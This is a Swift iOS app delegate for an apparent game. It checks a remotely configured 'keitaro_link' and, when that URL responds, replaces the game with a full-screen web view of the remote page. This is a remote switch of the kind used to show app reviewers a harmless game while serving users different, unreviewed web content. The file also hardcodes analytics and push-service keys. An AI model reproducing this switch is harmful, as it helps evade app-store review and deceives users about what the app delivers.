

import UIKit
import AppsFlyerLib
import Firebase
import FirebaseMessaging
import FirebaseRemoteConfig
import UserNotifications
import OneSignal
import AppTrackingTransparency

@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    

    var window: UIWindow?

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        
        FirebaseApp.configure()
        Crashlytics.crashlytics()
        
        OneSignal.setLogLevel(.LL_VERBOSE, visualLevel: .LL_NONE)

        OneSignal.initWithLaunchOptions(launchOptions)

        OneSignal.setAppId("72bb468b-326a-48f9-8a6c-f8f6e044317a")

        OneSignal.promptForPushNotifications(userResponse: { accepted in
            print("User accepted notifications: \(accepted)")
            print(OneSignal.getDeviceState().userId)
        })
        requestATTPermission()

        // SET DEVKEY AND APP ID
        AppsFlyerLib.shared().appsFlyerDevKey = "xevfqaNtRDpknJ"
        AppsFlyerLib.shared().appleAppID = "6446248566"

        self.window = UIWindow(frame: UIScreen.main.bounds)
        var isShowNav = true
                var remoteConfig = RemoteConfig.remoteConfig()

                let settings = RemoteConfigSettings()
                settings.minimumFetchInterval = 5
                remoteConfig.configSettings = settings

                remoteConfig.fetchAndActivate { (status, error) in
                    if error != nil {
                        self.startGame()
                        print(error?.localizedDescription)
                    } else {
                        if status != .error {
                            isShowNav = remoteConfig["isShowNav"].boolValue

                            if let whatToStart = remoteConfig["keitaro_link"].stringValue {
                                if let url = URL(string: whatToStart) {
                                    let networkManager = NetworkManager()
                                    networkManager.getData(from: url) { statusCode, error in
                                        if let error = error {
                                            DispatchQueue.main.async {
                                                self.startGame()
                                            }
                                            return
                                        }
                                        guard let statusCode = statusCode else {
                                            DispatchQueue.main.async {
                                                self.startGame()
                                            }
                                            return
                                        }
                                        if statusCode != 200 {
                                            DispatchQueue.main.async {
                                                self.startGame()
                                            }
                                            return
                                        }
                                        DispatchQueue.main.async {
                                            let vc = WebViewControler()
                                            self.window?.rootViewController = vc
                                            self.window?.makeKeyAndVisible()
                                            vc.isShowNav = isShowNav
                                            vc.urlString = whatToStart

                                                vc.start()

                                        }

                                    }
                                } else {
                                    DispatchQueue.main.async {
                                        self.startGame()
                                    }
                                }

                            }

                        }
                    }

                }
                let vc = UIViewController()
                let imV = UIImageView(image: UIImage(named: "launchImg"))
                vc.view.addSubview(imV)
        imV.frame = vc.view.frame
                imV.center = vc.view.center
                self.window?.rootViewController = vc
                self.window?.makeKeyAndVisible()
        

      
        return true

    }
    
    private func startGame() {
 
        let vc = MainViewController()
        self.window = UIWindow(frame: UIScreen.main.bounds)
        let nav = UINavigationController(rootViewController: vc)
        nav.navigationBar.isHidden = true
        self.window?.rootViewController = nav
        self.window?.makeKeyAndVisible()
  
    }
    
    func requestATTPermission() {
            if #available(iOS 14, *) {
                ATTrackingManager.requestTrackingAuthorization(completionHandler: { status in
                    print("TRUE!")
     
                })
                
            }
        }

    private func setupAppsFlayer() {
            AppsFlyerLib.shared().appsFlyerDevKey = "Fi7sNrX25Bnd8zQ7eaNJFY"
            AppsFlyerLib.shared().appleAppID = "6449245365"
        }


}

